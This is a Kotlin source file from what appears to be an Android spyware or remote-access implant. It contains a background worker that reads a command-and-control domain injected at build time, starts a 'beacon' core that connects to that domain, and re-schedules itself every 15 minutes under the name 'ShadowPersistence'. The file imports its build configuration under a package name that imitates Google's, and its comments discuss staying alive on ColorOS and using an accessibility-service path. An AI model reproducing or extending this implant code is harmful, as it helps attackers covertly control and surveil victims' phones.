package com.shadow

import android.content.Context
import androidx.work.*
import com.google.android.phonesync.BuildConfig
import java.util.concurrent.TimeUnit

class ShadowWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        // Domain injected at build time via BuildConfig (C2_DOMAIN env var in CI)
        val c2Domain = BuildConfig.C2_DOMAIN

        // Start the core. The Rust beacon loop owns its own lifetime and reconnect
        // backoff; it does NOT need this WorkManager slot held open. Previously this
        // blocked on delay(Long.MAX_VALUE) to "keep the process alive", but ColorOS
        // reaps the process every ~40s regardless of a held slot, so the delay just
        // burned a WorkManager window and suppressed the next periodic run (KEEP
        // policy) without adding any survival. Return promptly instead: the beacon
        // reconnects from scratch on the next run, and onServiceConnected() is the
        // low-latency path when a11y is bound.
        ShadowCore.start(applicationContext, c2Domain)

        return Result.success()
    }

    companion object {
        fun workManager(context: Context): WorkManager {
            return try {
                WorkManager.getInstance(context)
            } catch (e: IllegalStateException) {
                // Default initializer disabled in manifest — manual init
                WorkManager.initialize(context, Configuration.Builder().build())
                WorkManager.getInstance(context)
            }
        }

        fun enqueue(context: Context) {
            val request = PeriodicWorkRequestBuilder<ShadowWorker>(15, TimeUnit.MINUTES)
                .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
                .build()

            workManager(context).enqueueUniquePeriodicWork(
                "ShadowPersistence",
                ExistingPeriodicWorkPolicy.KEEP,
                request
            )
        }
    }
}
